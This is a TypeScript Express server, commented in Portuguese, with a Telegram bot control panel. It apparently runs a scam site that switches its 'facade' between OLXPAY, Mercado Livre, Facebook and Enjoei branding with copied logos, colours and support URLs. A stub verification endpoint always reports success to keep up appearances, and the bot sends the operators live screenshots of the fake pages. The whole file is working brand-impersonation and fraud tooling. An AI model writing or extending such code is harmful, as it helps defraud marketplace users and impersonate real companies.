import "dotenv/config";
import express from "express";
import cors from "cors";
import path from "path";
import dns from "dns";
import { promisify } from "util";
import TelegramBot from "node-telegram-bot-api";
import puppeteer from "puppeteer";

// Verificação de DNS removida (funcionalidade de e-mail desativada)


// Gerenciador de Instância Única do Puppeteer para ganho de performance
let browserInstance: puppeteer.Browser | null = null;
async function getBrowser() {
  if (browserInstance && browserInstance.connected) return browserInstance;
  
  console.log("🚀 Iniciando nova instância do Puppeteer...");
  const executablePath = path.join(process.cwd(), '.cache', 'puppeteer', 'chrome', 'win64-147.0.7727.57', 'chrome-win64', 'chrome.exe');
  
  browserInstance = await puppeteer.launch({ 
    headless: true,
    executablePath,
    args: [
      '--no-sandbox', 
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-accelerated-2d-canvas',
      '--no-first-run',
      '--no-zygote',
      '--disable-gpu',
      '--disable-extensions',
      '--js-flags="--max-old-space-size=256"' // Otimização de memória
    ] 
  });
  
  browserInstance.on('disconnected', () => {
    browserInstance = null;
  });
  
  return browserInstance;
}

// Listas de validação removidas (funcionalidade de e-mail desativada)


// Global State dinâmico
let dynamicConfig = {
  logoUrl: "/logos/olx/logo.png",
  buttonColor: "bg-[#6E0AD6] hover:bg-[#5a08b3]", // purple default
  siteName: "OLXPAY",
  supportUrl: "www.olx.com.br",
  logoClass: "h-36" // Aumentado (era h-28)
};

// Funções Auxiliares para o Painel do Telegram
const getPanelMessage = (requester?: string) => {
  let colorName = "Roxo (OLX)";
  if (dynamicConfig.buttonColor.includes('FFF159')) colorName = "Amarelo (ML)";
  else if (dynamicConfig.buttonColor.includes('1877F2')) colorName = "Azul (FB)";
  else if (dynamicConfig.buttonColor.includes('61005D')) colorName = "Roxo (Enjoei)";

  const header = requester ? `🎮 *Painel de Controle do Site* (por ${requester})\n\n` : `🎮 *Painel de Controle do Site*\n\n`;

  return header +
         `📌 *Empresa Ativa:* ${dynamicConfig.siteName}\n` +
         `🎨 *Estilo do Botão:* ${colorName}\n` +
         `🖼️ *Logo:* ${dynamicConfig.logoUrl}\n\n` +
         `Selecione abaixo para alterar a fachada do site instantaneamente:`;
};

const getPanelOptions = () => {
  return {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: '🟣 Fachada OLXPAY', callback_data: 'set_olx' }],
        [{ text: '🟡 Fachada Mercado Livre', callback_data: 'set_ml' }],
        [{ text: '🔵 Fachada Facebook', callback_data: 'set_fb' }],
        [{ text: '🌂 Fachada Enjoei', callback_data: 'set_enjoei' }],
        [{ text: '📱 Capturar Print Mobile', callback_data: 'req_print_mobile' }],
        [{ text: '💻 Capturar Print PC', callback_data: 'req_print_pc' }]
      ]
    }
  };
};
import { createServer as createViteServer } from "vite";

async function startServer() {
  const app = express();
  const PORT = process.env.PORT || 3000;

  app.use(cors());
  app.use(express.json());

  app.get("/api/config", (req, res) => {
    res.json(dynamicConfig);
  });

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (botToken) {
    const bot = new TelegramBot(botToken, { 
      polling: {
        interval: 100, // Mais rápido para resposta instantânea
        autoStart: true,
        params: {
          timeout: 5 // Reduzido para evitar "hangs" longos
        }
      } 
    });

    // Limpa webhooks antigos e mensagens pendentes para garantir resposta instantânea
    await bot.deleteWebHook({ drop_pending_updates: true });

    // Registra os comandos no menu do Telegram automaticamente
    await bot.setMyCommands([
      { command: 'painel', description: 'Abrir o painel de controle do site' }
    ]);
    
    bot.on('polling_error', (error) => {
      // Ignora erros comuns de conflito se houver múltiplas instâncias, mas avisa no log
      if (error.code === 'ETELEGRAM' && error.message.includes('409')) {
        console.log("⚠️ Conflito de polling detectado. Outra instância pode estar rodando.");
      } else {
        console.log("ERRO NO BOT (Polling):", error.code, error.message);
      }
    });

    bot.on('error', (error) => {
      console.log("ERRO FATAL NO BOT:", error.message);
    });

    const adminChatId = process.env.TELEGRAM_CHAT_ID;
    if (adminChatId) {
      bot.sendMessage(adminChatId, "🚀 *Bot Online & Otimizado*\nSistema de print pronto e aguardando comandos.", { parse_mode: "Markdown" })
        .catch(e => console.log("Erro ao enviar mensagem de boot:", e.message));
    }

    console.log("Bot do Telegram inicializado e limpo...");

    bot.onText(/\/painel/, (msg) => {
      console.time(`Command-${msg.message_id}`);
      const user = msg.from;
      const requester = user?.username ? `@${user.username}` : user?.first_name || 'Admin';
      bot.sendMessage(msg.chat.id, getPanelMessage(requester), getPanelOptions())
        .then(() => console.timeEnd(`Command-${msg.message_id}`));
    });

    bot.on('callback_query', async (query) => {
      console.time(`Callback-${query.id}`);
      const data = query.data;
      const chatId = query.message?.chat.id;
      const messageId = query.message?.message_id;
      const user = query.from;
      const requester = user?.username ? `@${user.username}` : user?.first_name || 'Admin';

      if (!chatId || !messageId) return;

      let changed = false;

      if (data === 'set_olx') {
        if (dynamicConfig.siteName === "OLXPAY") {
          return bot.answerCallbackQuery(query.id, { text: "⚠️ O site já está no modelo OLXPAY!", show_alert: true });
        }
        dynamicConfig.buttonColor = "bg-[#6E0AD6] hover:bg-[#5a08b3]";
        dynamicConfig.logoUrl = "/logos/olx/logo.png";
        dynamicConfig.siteName = "OLXPAY";
        dynamicConfig.supportUrl = "www.olx.com.br";
        dynamicConfig.logoClass = "h-36"; // Aumentado
        changed = true;
      } else if (data === 'set_ml') {
        if (dynamicConfig.siteName === "Mercado Livre") {
          return bot.answerCallbackQuery(query.id, { text: "⚠️ O site já está no modelo Mercado Livre!", show_alert: true });
        }
        dynamicConfig.buttonColor = "bg-[#FFF159] hover:bg-[#FFE600] text-[#333]";
        dynamicConfig.logoUrl = "/logos/mercadolivre/logo.png";
        dynamicConfig.siteName = "Mercado Livre";
        dynamicConfig.supportUrl = "www.mercadolivre.com.br";
        dynamicConfig.logoClass = "h-20"; // Diminuído (era h-28)
        changed = true;
      } else if (data === 'set_fb') {
        if (dynamicConfig.siteName === "Facebook") {
          return bot.answerCallbackQuery(query.id, { text: "⚠️ O site já está no modelo Facebook!", show_alert: true });
        }
        dynamicConfig.buttonColor = "bg-[#1877F2] hover:bg-[#166FE5]";
        dynamicConfig.logoUrl = "/logos/facebook/logo.png";
        dynamicConfig.siteName = "Facebook";
        dynamicConfig.supportUrl = "www.facebook.com";
        dynamicConfig.logoClass = "h-16"; // Facebook logo smaller as requested
        changed = true;
      } else if (data === 'set_enjoei') {
        if (dynamicConfig.siteName === "Enjoei") {
          return bot.answerCallbackQuery(query.id, { text: "⚠️ O site já está no modelo Enjoei!", show_alert: true });
        }
        dynamicConfig.buttonColor = "bg-[#61005D] hover:bg-[#4d004a]";
        dynamicConfig.logoUrl = "/logos/enjoei/logo.png";
        dynamicConfig.siteName = "Enjoei";
        dynamicConfig.supportUrl = "www.enjoei.com.br";
        dynamicConfig.logoClass = "h-20";
        changed = true;
      } else if (data === 'req_print_mobile' || data === 'req_print_pc') {
        const isMobile = data === 'req_print_mobile';
        bot.answerCallbackQuery(query.id, { text: `📸 Gerando print...` });
        // Não usar await aqui para liberar o bot instantaneamente
        handlePrint(bot, chatId, PORT, requester, isMobile);
        return;
      }

      if (changed) {
        try {
          await bot.editMessageText(getPanelMessage(requester), {
            chat_id: chatId,
            message_id: messageId,
            ...getPanelOptions()
          });
          bot.answerCallbackQuery(query.id, { text: `✅ Site atualizado por ${requester}!` });
        } catch (err) {
          console.error("Erro ao editar mensagem:", err);
        }
      }
      console.timeEnd(`Callback-${query.id}`);
    });

    // Função para lidar com o comando de logo manual se necessário
    bot.onText(/\/logo (.+)/, (msg, match) => {
      const user = msg.from;
      const requester = user?.username ? `@${user.username}` : user?.first_name || "Admin";
      if (match && match[1]) {
        dynamicConfig.logoUrl = match[1];
        bot.sendMessage(msg.chat.id, `✅ Logo alterada para link externo por ${requester}.`);
      }
    });

    const handlePrint = async (bot: any, chatId: number, port: number, requester?: string, isMobile: boolean = false) => {
      console.time(`Print-${chatId}`);
      let browser: puppeteer.Browser | null = null;
      try {
        browser = await getBrowser();
        const page = await browser.newPage();
        
        if (isMobile) {
          // iPhone 14 Pro
          await page.setViewport({ width: 393, height: 852, deviceScaleFactor: 3, isMobile: true, hasTouch: true });
          await page.setUserAgent("Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1");
        } else {
          // PC Full HD
          await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
        }
        
        // Timeout menor e estratégia de carregamento otimizada
        await page.goto(`http://localhost:${port}`, { 
          waitUntil: 'networkidle0', 
          timeout: 7000 
        });

        // Desativa animações para capturar instantaneamente sem embaçar
        let customStyle = `*, *::before, *::after { transition: none !important; animation: none !important; }`;
        if (isMobile) {
          customStyle += ` #footer-thanks { display: none !important; }`;
        }
        await page.addStyleTag({ content: customStyle });

        // Pausa reduzida já que usamos networkidle0
        await new Promise(r => setTimeout(r, 100));

        const screenshotBuffer = await page.screenshot({ type: 'jpeg', quality: 80 }); // Qualidade 80 é mais rápida e suficiente
        await page.close(); // Fecha apenas a página, não o browser
        
        const typeName = isMobile ? "Mobile (iPhone)" : "PC";
        const caption = requester ? `📱 Print ao vivo do site em ${typeName} (solicitado por ${requester}).` : `📱 Print ao vivo do site em ${typeName}.`;
        await bot.sendPhoto(chatId, Buffer.from(screenshotBuffer), { caption });
        console.timeEnd(`Print-${chatId}`);
      } catch (err) {
        console.error("Erro no Puppeteer:", err);
        bot.sendMessage(chatId, "❌ Erro ao gerar o print. O servidor pode estar sobrecarregado.");
        if (browser && (err as any).message.includes('disconnected')) {
          browserInstance = null;
        }
      }
    };


  }

  // Rota de verificação simplificada (apenas retorna sucesso para manter o visual do site)
  app.post("/api/verify", (req, res) => {
    res.json({ success: true });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
